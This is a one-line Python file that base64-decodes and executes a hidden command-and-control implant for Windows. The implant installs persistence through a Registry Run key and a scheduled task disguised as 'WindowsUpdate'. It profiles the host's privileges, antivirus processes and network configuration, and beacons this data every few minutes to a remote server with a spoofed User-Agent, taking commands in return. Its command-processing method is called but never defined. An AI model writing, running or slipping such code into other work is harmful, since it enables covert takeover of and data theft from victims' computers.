exec(__import__('base64').b64decode('IyBQZXJzaXN0ZW50IExpZ2h0QzIgSW1wbGFudCB3aXRoIG11bHRpcGxlIHBlcnNpc3RlbmNlIG1lY2hhbmlzbXMKaW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgd2lucmVnICAjIFdpbmRvd3MgcmVnaXN0cnkgZm9yIHBlcnNpc3RlbmNlCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKCmNsYXNzIFBlcnNpc3RlbnRMaWdodEMySW1wbGFudDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjMl9zZXJ2ZXIsIGltcGxhbnRfaWQpOgogICAgICAgIHNlbGYuYzJfc2VydmVyID0gYzJfc2VydmVyCiAgICAgICAgc2VsZi5pbXBsYW50X2lkID0gaW1wbGFudF9pZAogICAgICAgIHNlbGYuYmVhY29uX2ludGVydmFsID0gMzAwICAjIDUgbWludXRlcwogICAgICAgIHNlbGYuaW5zdGFsbF9wYXRoID0gb3MucGF0aC5qb2luKG9zLmdldGVudignQVBQREFUQScpLCAnV2luZG93c1VwZGF0ZScsICd3dWF1Y2x0LmV4ZScpCiAgICAKICAgIGRlZiBpbnN0YWxsX3BlcnNpc3RlbmNlKHNlbGYpOgogICAgICAgICIiIkluc3RhbGwgbXVsdGlwbGUgcGVyc2lzdGVuY2UgbWVjaGFuaXNtcyIiIgogICAgICAgIGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICdXaW5kb3dzJzoKICAgICAgICAgICAgIyBSZWdpc3RyeSBydW4ga2V5CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5KHdpbnJlZy5IS0VZX0NVUlJFTlRfVVNFUiwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciJTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwLCB3aW5yZWcuS0VZX1NFVF9WQUxVRSkKICAgICAgICAgICAgICAgIHdpbnJlZy5TZXRWYWx1ZUV4KGtleSwgJ1dpbmRvd3NVcGRhdGUnLCAwLCB3aW5yZWcuUkVHX1NaLCBzeXMuZXhlY3V0YWJsZSkKICAgICAgICAgICAgICAgIHdpbnJlZy5DbG9zZUtleShrZXkpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgCiAgICAgICAgICAgICMgU2NoZWR1bGVkIHRhc2sKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdGFza19jbWQgPSBmJ3NjaHRhc2tzIC9jcmVhdGUgL3RuICJNaWNyb3NvZnRcV2luZG93c1xXaW5kb3dzVXBkYXRlIiAvdHIgIntzeXMuZXhlY3V0YWJsZX0iIC9zYyBob3VybHkgL2YnCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bih0YXNrX2NtZCwgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIAogICAgICAgICMgQ29weSB0byBpbnN0YWxsIHBhdGgKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhzZWxmLmluc3RhbGxfcGF0aCk6CiAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhvcy5wYXRoLmRpcm5hbWUoc2VsZi5pbnN0YWxsX3BhdGgpLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgIyBJbiByZWFsIHNjZW5hcmlvLCB3b3VsZCBjb3B5IHRoZSBleGVjdXRhYmxlCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oc2VsZi5pbnN0YWxsX3BhdGgsICd3JykgYXMgZjoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKCcjJyArICcKJy5qb2luKHN5cy5hcmd2KSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgIAogICAgZGVmIGJlYWNvbihzZWxmKToKICAgICAgICAiIiJFbmhhbmNlZCBiZWFjb24gd2l0aCBzeXN0ZW0gcHJvZmlsaW5nIiIiCiAgICAgICAgc3lzdGVtX2luZm8gPSB7CiAgICAgICAgICAgICdpbXBsYW50X2lkJzogc2VsZi5pbXBsYW50X2lkLAogICAgICAgICAgICAnaG9zdG5hbWUnOiBwbGF0Zm9ybS5ub2RlKCksCiAgICAgICAgICAgICdvcyc6IHBsYXRmb3JtLnN5c3RlbSgpLAogICAgICAgICAgICAndmVyc2lvbic6IHBsYXRmb3JtLnZlcnNpb24oKSwKICAgICAgICAgICAgJ2FyY2hpdGVjdHVyZSc6IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpWzBdLAogICAgICAgICAgICAncHJvY2Vzc29yJzogcGxhdGZvcm0ucHJvY2Vzc29yKCksCiAgICAgICAgICAgICd1c2VyJzogb3MuZ2V0ZW52KCdVU0VSTkFNRScpIG9yIG9zLmdldGVudignVVNFUicpLAogICAgICAgICAgICAncHJpdmlsZWdlcyc6IHNlbGYuY2hlY2tfcHJpdmlsZWdlcygpLAogICAgICAgICAgICAnYW50aXZpcnVzJzogc2VsZi5kZXRlY3RfYXYoKSwKICAgICAgICAgICAgJ25ldHdvcmtfaW5mbyc6IHNlbGYuZ2V0X25ldHdvcmtfaW5mbygpLAogICAgICAgICAgICAndGltZXN0YW1wJzogdGltZS50aW1lKCkKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoCiAgICAgICAgICAgICAgICBmIntzZWxmLmMyX3NlcnZlcn0vYmVhY29uIiwKICAgICAgICAgICAgICAgIGpzb249c3lzdGVtX2luZm8sCiAgICAgICAgICAgICAgICBoZWFkZXJzPXsnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYnfSwKICAgICAgICAgICAgICAgIHRpbWVvdXQ9MTUKICAgICAgICAgICAgKQogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMCBlbHNlIE5vbmUKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAKICAgIGRlZiBjaGVja19wcml2aWxlZ2VzKHNlbGYpOgogICAgICAgICIiIkNoZWNrIGlmIHJ1bm5pbmcgd2l0aCBlbGV2YXRlZCBwcml2aWxlZ2VzIiIiCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBwbGF0Zm9ybS5zeXN0ZW0oKSA9PSAnV2luZG93cyc6CiAgICAgICAgICAgICAgICBpbXBvcnQgY3R5cGVzCiAgICAgICAgICAgICAgICByZXR1cm4gY3R5cGVzLndpbmRsbC5zaGVsbDMyLklzVXNlckFuQWRtaW4oKSAhPSAwCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXR1cm4gb3MuZ2V0ZXVpZCgpID09IDAKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICBkZWYgZGV0ZWN0X2F2KHNlbGYpOgogICAgICAgICIiIkRldGVjdCBhbnRpdmlydXMgc29mdHdhcmUiIiIKICAgICAgICBhdl9wcm9kdWN0cyA9IFtdCiAgICAgICAgCiAgICAgICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gJ1dpbmRvd3MnOgogICAgICAgICAgICAjIENoZWNrIGNvbW1vbiBBViBwcm9jZXNzZXMKICAgICAgICAgICAgYXZfcHJvY2Vzc2VzID0gWwogICAgICAgICAgICAgICAgJ21zbXBlbmcuZXhlJywgJ25vZDMya3JuLmV4ZScsICdhdnAuZXhlJywgCiAgICAgICAgICAgICAgICAnYmRhZ2VudC5leGUnLCAnYXZndWFyZC5leGUnLCAnc3BpZGVyYWdlbnQuZXhlJwogICAgICAgICAgICBdCiAgICAgICAgICAgIAogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvdXRwdXQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgndGFza2xpc3QnLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5sb3dlcigpCiAgICAgICAgICAgICAgICBmb3IgcHJvYyBpbiBhdl9wcm9jZXNzZXM6CiAgICAgICAgICAgICAgICAgICAgaWYgcHJvYyBpbiBvdXRwdXQ6CiAgICAgICAgICAgICAgICAgICAgICAgIGF2X3Byb2R1Y3RzLmFwcGVuZChwcm9jKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgCiAgICAgICAgcmV0dXJuIGF2X3Byb2R1Y3RzCiAgICAKICAgIGRlZiBnZXRfbmV0d29ya19pbmZvKHNlbGYpOgogICAgICAgICIiIkdhdGhlciBuZXR3b3JrIGluZm9ybWF0aW9uIiIiCiAgICAgICAgbmV0d29ya19pbmZvID0ge30KICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgICMgR2V0IElQIGFkZHJlc3NlcwogICAgICAgICAgICBpZiBwbGF0Zm9ybS5zeXN0ZW0oKSA9PSAnV2luZG93cyc6CiAgICAgICAgICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLnJ1bihbJ2lwY29uZmlnJ10sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkKICAgICAgICAgICAgICAgIG5ldHdvcmtfaW5mb1snaXBjb25maWcnXSA9IHJlc3VsdC5zdGRvdXQKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKFsnaWZjb25maWcnXSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlKQogICAgICAgICAgICAgICAgbmV0d29ya19pbmZvWydpZmNvbmZpZyddID0gcmVzdWx0LnN0ZG91dAogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgICAgIAogICAgICAgIHJldHVybiBuZXR3b3JrX2luZm8KICAgIAogICAgZGVmIG1haW5fbG9vcChzZWxmKToKICAgICAgICAiIiJNYWluIGltcGxhbnQgbG9vcCB3aXRoIGVycm9yIGhhbmRsaW5nIiIiCiAgICAgICAgc2VsZi5pbnN0YWxsX3BlcnNpc3RlbmNlKCkKICAgICAgICAKICAgICAgICBlcnJvcl9jb3VudCA9IDAKICAgICAgICBtYXhfZXJyb3JzID0gNQogICAgICAgIAogICAgICAgIHdoaWxlIGVycm9yX2NvdW50IDwgbWF4X2Vycm9yczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgY29tbWFuZHMgPSBzZWxmLmJlYWNvbigpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGNvbW1hbmRzOgogICAgICAgICAgICAgICAgICAgICMgUHJvY2VzcyBjb21tYW5kcyBmcm9tIEMyCiAgICAgICAgICAgICAgICAgICAgc2VsZi5wcm9jZXNzX2NvbW1hbmRzKGNvbW1hbmRzKQogICAgICAgICAgICAgICAgICAgIGVycm9yX2NvdW50ID0gMCAgIyBSZXNldCBlcnJvciBjb3VudCBvbiBzdWNjZXNzCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGVycm9yX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdGltZS5zbGVlcChzZWxmLmJlYWNvbl9pbnRlcnZhbCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBlcnJvcl9jb3VudCArPSAxCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKG1pbigzMDAsIHNlbGYuYmVhY29uX2ludGVydmFsICogMikpICAjIEJhY2tvZmYgb24gZXJyb3JzCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgQzJfU0VSVkVSID0gImh0dHBzOi8vbGVnaXRpbWF0ZS1jZG4uY29tL2FwaSIKICAgIElNUExBTlRfSUQgPSAiaW1wbGFudF8yMDI1MTEwMzExMDkxNF9qczVuajUiCiAgICAKICAgIGltcGxhbnQgPSBQZXJzaXN0ZW50TGlnaHRDMkltcGxhbnQoQzJfU0VSVkVSLCBJTVBMQU5UX0lEKQogICAgaW1wbGFudC5tYWluX2xvb3AoKQ=='))